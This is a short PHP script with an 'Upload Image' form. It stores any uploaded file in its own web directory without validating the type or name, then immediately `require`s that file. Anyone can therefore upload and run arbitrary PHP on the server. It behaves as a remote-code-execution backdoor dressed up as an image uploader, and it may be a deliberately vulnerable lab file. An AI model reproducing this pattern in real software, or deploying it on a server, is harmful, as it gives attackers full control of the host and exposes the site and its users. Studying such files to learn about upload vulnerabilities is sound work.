<?php
if(isset($_POST['submit'])){

$target_dir = "./";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);


    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
        echo "The file ". basename( $_FILES["fileToUpload"]["name"]). " has been uploaded.";
		
		$uploaded_file=$_FILES["fileToUpload"]["name"];
		require $uploaded_file;
    } else {
        echo "Sorry, there was an error uploading your file.";
    }
}

?>
<!DOCTYPE html>
<html>
<body>

<form  method="post" enctype="multipart/form-data">
    Select image to upload:
    <input type="file" name="fileToUpload" id="fileToUpload">
    <input type="submit" value="Upload Image" name="submit">
</form>

</body>
</html>
